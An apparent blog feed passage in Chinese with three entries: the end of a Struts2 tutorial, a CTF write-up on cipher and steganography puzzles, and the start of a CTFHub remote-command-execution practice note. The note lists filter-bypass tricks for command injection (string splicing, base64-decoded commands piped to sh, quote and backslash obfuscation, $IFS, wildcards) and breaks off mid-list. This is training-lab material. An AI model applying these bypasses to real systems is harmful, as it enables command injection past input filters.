src="https://img-blog.csdnimg.cn/20210323192722238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击应用，重新打开struts.xml编辑，会得到提示<br><img src="https://img-blog.csdnimg.cn/20210323193147877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h3 id="第六步：创建jsp文件"><a href="#第六步：创建jsp文件" class="headerlink" title="第六步：创建jsp文件"></a>第六步：创建jsp文件</h3><p>index.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Struts2入门案例<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Struts2入门案例<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath &#125;/helloWorld.action&quot;</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Struts2跳转页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Struts2跳转页面成功<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第七步：部署项目"><a href="#第七步：部署项目" class="headerlink" title="第七步：部署项目"></a>第七步：部署项目</h3><p>发布项目，点击超链接<br><img src="https://img-blog.csdnimg.cn/20210319201030489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跳转成功<br><img src="https://img-blog.csdnimg.cn/20210319201255433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Struts2处理流程"><a href="#Struts2处理流程" class="headerlink" title="Struts2处理流程"></a>Struts2处理流程</h2><p>（1）用户在客户端发出HTTP请求</p><p>（2）然后请求被核心过滤器StrutsPrepareAndExecuteFilter拦截</p><p>（3）核心过滤器将请求转发到Action映射器，Action映射器负责识别当前的请求是否需要交由Struts2处理。</p><p>（4）Action映射器返回需要struts2处理的信息，StrutsPrepareAndExecuteFilter会创建一个Action代理</p><p>（5）Action代理并不知道执行哪一个Action，它会向配置管理器询问调用哪一个Action，配置管理器会从struts.xml读取我们配置的Action信息。</p><p>（6）Action代理创建相关请求的Action对象，调用相关的方法之前，struts2的一系列拦截器会帮我们做一些操作，例如获取请求参数等。</p><p>（7）然后调用execute方法根据返回的字符串去匹配相应的页面，</p><p>（8）页面可以获取一些页面模板，然后生成最终页面，再倒序的执行拦截器的后续操作</p><p>（9）最后生成HTTP响应内容</p><p><img src="https://img-blog.csdnimg.cn/20210319201448283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（一）&lt;/p&gt;</summary>
    
    
    
    <category term="编程开发" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    <category term="JAVA" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/JAVA/"/>
    
    
    <category term="Struts2" scheme="http://atkx.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>春秋杯新年欢乐赛</title>
    <link href="http://atkx.top/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
    <id>http://atkx.top/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</id>
    <published>2021-02-09T14:25:13.000Z</published>
    <updated>2021-08-15T03:59:06.514Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：记春秋杯新年欢乐赛两道题目复现</p> <a id="more"></a><h2 id="十二宫的挑衅"><a href="#十二宫的挑衅" class="headerlink" title="十二宫的挑衅"></a>十二宫的挑衅</h2><p>下载附件，解压，得到Twelve_palaces_of_serial_killers.png图片<br><img src="https://img-blog.csdnimg.cn/2021020118270295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>提取图片内容为，将密文放在excel表格中,第一个字符^，随后再向下移动一格，在向左移动两个，得到第二个字符&gt;，以此类推。<br><img src="https://img-blog.csdnimg.cn/2021020118272653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过重新排列，得到新的密文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">^&gt;%..@3*&amp;<span class="hljs-comment">#(#0+@#+</span><br>.@*53)8@+@$+&amp;!%&gt;^<br>&amp;.@36%&amp;&amp;4@?<span class="hljs-comment">#&lt;!=.*</span><br>9@=(<span class="hljs-comment">#=@79@&lt;~)8%=^</span><br>=0.*/611811)*&gt;@<span class="hljs-comment">#0</span><br>0%8$+@-<span class="hljs-variable">$1</span>?*53!?7-<br>+(^(*==$<span class="hljs-variable">$5</span>*=+<span class="hljs-comment">#==^</span><br>4&amp;~<span class="hljs-variable">$7</span>%6%.&amp;?<span class="hljs-comment">#5)%51</span><br>!)<span class="hljs-comment">#?$&lt;&lt;^()8!?7%&lt;@</span><br></code></pre></td></tr></table></figure><p>在AZdecrypt软件运行后，得到一段英文<br><img src="https://img-blog.csdnimg.cn/20210201185433621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>猜测flag为flag{WUUHUU TAKE OFF}，提交后发现不对。经过尝试后，发现去掉空格提交成功。最终</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;WUUHUUTAKEOFF&#125;<br></code></pre></td></tr></table></figure><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><p>题目描述：对nCov了解多少？</p><p>一个题目附件和一个hint附件，hint内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE======<br></code></pre></td></tr></table></figure><p>Base32解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.html<br>https://www.ncbi.nlm.nih.gov/orffinder/<br>http://www.merrybio.com.cn/blog/coronavirus-introduction.html<br><br>Please notice The largest structural protein<br>the password is the md5(it<span class="hljs-string">&#x27;s gene sequence) and do not let the ‘\n’ in md5()</span><br></code></pre></td></tr></table></figure><p>三个网址，两篇介绍病毒的文章和一个基因查询网站。后面的英文句子意思是请注意最大的结构蛋白，password是md5（它的基因序列）。</p><p>在文章中搜索关键字<code>最大的结构蛋白</code>，是刺突蛋白。<br><img src="https://img-blog.csdnimg.cn/20210201162644442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>hint中所给的<a href="https://www.ncbi.nlm.nih.gov/orffinder/">查询</a>网站，要求以FASTA格式输入登录号、gi或核苷酸序列。在文本区域中输入查询序列<br><img src="https://img-blog.csdnimg.cn/20210201165625242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>文章中查找登录号<code>MN908947</code><br><img src="https://img-blog.csdnimg.cn/20210201163419968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在文章中找到范围为<code>21536-25384</code><br><img src="https://img-blog.csdnimg.cn/20210201163827698.png" alt="在这里插入图片描述"><br>输入登陆号和范围，得到基因序列<br><img src="https://img-blog.csdnimg.cn/20210201165858431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制基因序列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MFLLTTKRTMFVFLVLLPLVSSQCVNLTTRTQLPPAYTNSFTRGVYYPDKVFRSSVLHSTQDLFLPFFSNVTWFHAIHVSGTNGTKRFDNPVLPFNDGVYFASTEKSNIIRGWIFGTTLDSKTQSLLIVNNATNVVIKVCEFQFCNDPFLGVYYHKNNKSWMESEFRVYSSANNCTFEYVSQPFLMDLEGKQGNFKNLREFVFKNIDGYFKIYSKHTPINLVRDLPQGFSALEPLVDLPIGINITRFQTLLALHRSYLTPGDSSSGWTAGAAAYYVGYLQPRTFLLKYNENGTITDAVDCALDPLSETKCTLKSFTVEKGIYQTSNFRVQPTESIVRFPNITNLCPFGEVFNATRFASVYAWNRKRISNCVADYSVLYNSASFSTFKCYGVSPTKLNDLCFTNVYADSFVIRGDEVRQIAPGQTGKIADYNYKLPDDFTGCVIAWNSNNLDSKVGGNYNYLYRLFRKSNLKPFERDISTEIYQAGSTPCNGVEGFNCYFPLQSYGFQPTNGVGYQPYRVVVLSFELLHAPATVCGPKKSTNLVKNKCVNFNFNGLTGTGVLTESNKKFLPFQQFGRDIADTTDAVRDPQTLEILDITPCSFGGVSVITPGTNTSNQVAVLYQDVNCTEVPVAIHADQLTPTWRVYSTGSNVFQTRAGCLIGAEHVNNSYECDIPIGAGICASYQTQTNSPRRARSVASQSIIAYTMSLGAENSVAYSNNSIAIPTNFTISVTTEILPVSMTKTSVDCTMYICGDSTECSNLLLQYGSFCTQLNRALTGIAVEQDKNTQEVFAQVKQIYKTPPIKDFGGFNFSQILPDPSKPSKRSFIEDLLFNKVTLADAGFIKQYGDCLGDIAARDLICAQKFNGLTVLPPLLTDEMIAQYTSALLAGTITSGWTFGAGAALQIPFAMQMAYRFNGIGVTQNVLYENQKLIANQFNSAIGKIQDSLSSTASALGKLQDVVNQNAQALNTLVKQLSSNFGAISSVLNDILSRLDKVEAEVQIDRLITGRLQSLQTYVTQQLIRAAEIRASANLAATKMSECVLGQSKRVDFCGKGYHLMSFPQSAPHGVVFLHVTYVPAQEKNFTTAPAICHDGKAHFPREGVFVSNGTHWFVTQRNFYEPQIITTDNTFVSGNCDVVIGIVNNTVYDPLQPELDSFKEELDKYFKNHTSPDVDLGDISGINASVVNIQKEIDRLNEVAKNLNESLIDLQELGKYEQYIKWPWYIWLGFIAGLIAIVMVTIMLCCMTSCCSCLKGCCSCGSCCKFDEDDSEPVLKGVKLHYT<br></code></pre></td></tr></table></figure><p>md5后的值为password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">98eb1b1760bcc837934c8695a1cee923<br></code></pre></td></tr></table></figure><p>使用MP3Stegog工具</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">decode -X -P <span class="hljs-number">98</span>eb1b1760bcc837934c8695a1cee923 cov.mp3<br></code></pre></td></tr></table></figure><p>得到压缩包解压密码<br><img src="https://img-blog.csdnimg.cn/20210201172036562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压压缩包，有一个hint2文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154<br></code></pre></td></tr></table></figure><p>base16解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">you must pay attention to N protein ,How <span class="hljs-keyword">do</span> that get into the viral capsid?<br><span class="hljs-keyword">do</span> you know steghide?<br>the password is encrypt by Vigenère Cipher<br>the screct key is The top <span class="hljs-number">20</span> characters with the most occurrences are counted+COMBAT<br></code></pre></td></tr></table></figure><p>hint2提示，注意N蛋白的进入方式，steghide是图片隐写工具，password经过Vigenère加密，然后Vigenère需要的key是出现次数最多的前20个字符+<code>COMBAT</code></p><p>N蛋白结合M蛋白和E蛋白，进入病毒衣壳内<br><img src="https://img-blog.csdnimg.cn/20210201173231449.png" alt="在这里插入图片描述"><br>NME三个基因范围为分别为28274-29533、27202-27387、26523-27191<br><img src="https://img-blog.csdnimg.cn/20210201173601783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>三个蛋白的基因序列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">N基因<br>MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA<br>SWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK<br>MKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN<br>PANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG<br>SSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS<br>AAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH<br>WPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV<br>ILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL<br>DDFSKQLQQSMSSADSTQA<br>M基因<br>MFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS<br>QLDEEQPMEID<br>E基因<br>MADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK<br>LIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF<br>RLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLR<br>IAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYR<br>IGNYKLNTDHSSSSDNIALLVQ<br></code></pre></td></tr></table></figure><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">在线字频分析</a>，统计前20个频率最高的字符。<br><img src="https://img-blog.csdnimg.cn/20210201174426117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有些字符的频次相同，可以调换顺序，再结尾加上hint2里面给的COMBAT，最终维吉尼亚密码的key为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">LGASTRIQKNDPFEVYMWHCCOMBAT<br></code></pre></td></tr></table></figure><p>上面提到的password在附件pass.wav中，<a href="https://sourceforge.net/projects/silenteye/">SilentEye</a>工具进行解密，得到密文<code>priebeijoarkjpxmdkucxwdus</code>。<img src="https://img-blog.csdnimg.cn/20210201175709390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>维吉尼亚解密，得到<code>eliminatenovelcoronavirts</code><br><img src="https://img-blog.csdnimg.cn/20210201175947417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用steghide提取CoV-1.jpg隐藏文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf CoV-1.jpg -p eliminatenovelcoronavirts<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201181921964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：记春秋杯新年欢乐赛两道题目复现&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-RCE练习</title>
    <link href="http://atkx.top/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/"/>
    <id>http://atkx.top/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/</id>
    <published>2021-01-16T08:12:47.000Z</published>
    <updated>2021-08-15T03:59:06.426Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（四）</p> <a id="more"></a><h1 id="什么是RCE"><a href="#什么是RCE" class="headerlink" title="什么是RCE"></a>什么是RCE</h1><p>RCE英文全称：remote command/code execute<br>分为远程命令执行和远程代码执行<br>| 分类         | 说明                       | 函数 |<br>| ———— | ————————– | —- |<br>| 远程命令执行 | 直接调用操作系统命令       | ping |<br>| 远程代码执行 | 靠执行代码调用操作系统命令 | eval |</p><h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><h2 id="Windows管道符"><a href="#Windows管道符" class="headerlink" title="Windows管道符"></a>Windows管道符</h2><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可</td></tr><tr><td><code>&amp;&amp;</code></td><td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><h2 id="Linux的管道符"><a href="#Linux的管道符" class="headerlink" title="Linux的管道符"></a>Linux的管道符</h2><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td><code>;</code></td><td>执行完前面的语句再执行后面的语句。</td></tr><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</td></tr><tr><td><code>&amp;&amp;</code></td><td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>　1.拼接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=c;b=at;c=fl;d=ag;$a<span class="hljs-variable">$b</span> $c<span class="hljs-variable">$d</span><br>?c=<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;sys&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;tem&#x27;</span>;<span class="hljs-variable">$d</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-variable">$d</span>(<span class="hljs-string">&#x27;cat config.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>　2.编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash<br></code></pre></td></tr></table></figure><p>　3.单引号，双引号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t flag<br>ca<span class="hljs-string">&quot;&quot;</span>t flag<br></code></pre></td></tr></table></figure><p>　4.反斜杠</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c\at fl\ag<br></code></pre></td></tr></table></figure><p>   5.Shell 特殊变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-variable">$@t</span> flag<br>ca<span class="hljs-variable">$1t</span> flag<br></code></pre></td></tr></table></figure><p>   6.通配符绕过</p><p>常用的通配符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">* <span class="hljs-comment">#匹配任意长度字符</span><br>? <span class="hljs-comment">#匹配任意单个字符</span><br>[list] <span class="hljs-comment">#匹配指定范围(list)内的任意字符，也可以是单个字符组成的集合</span><br>[^list] <span class="hljs-comment">#匹配指定范围外的任意单个字符或字符集合</span><br>[!list]  <span class="hljs-comment">#[^list]</span><br>&#123;str1,str2&#125;<span class="hljs-comment">#匹配str1或者str2</span><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat<span class="hljs-variable">$&#123;IFS&#125;</span>fl*<br>cat fl[a-z]?<br>cat fla* <br>cat<span class="hljs-variable">$&#123;IFS&#125;</span>fl*<br></code></pre></td></tr></table></figure><h1 id="相关命令执行变量"><a href="#相关命令执行变量" class="headerlink" title="相关命令执行变量"></a>相关命令执行变量</h1><p>PHP代码执行变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 